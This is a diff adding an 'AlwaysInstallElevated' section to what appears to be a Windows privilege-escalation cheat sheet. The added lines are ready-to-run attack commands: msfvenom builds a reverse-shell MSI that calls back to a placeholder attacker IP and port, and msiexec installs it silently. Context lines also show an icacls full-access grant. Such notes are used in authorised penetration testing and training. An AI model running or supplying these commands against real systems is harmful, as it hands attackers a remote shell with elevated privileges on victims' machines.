@@ -46,6 +46,17 @@ REM grant full access
 icacls <file> /grant <user>:F
 ```
 
+AlwaysInstallElevated
+
+```
+# AlwaysInstallElevated set to 1 in HKLM!
+# AlwaysInstallElevated set to 1 in HKCU! 
+# using msfvenom to create payload
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
+# execute <payload> = reverse.msi
+msiexec /quiet /qn /i <payload>
+```
+
 Tools
 
 [Chisel](https://github.com/jpillora/chisel):Pivoting 
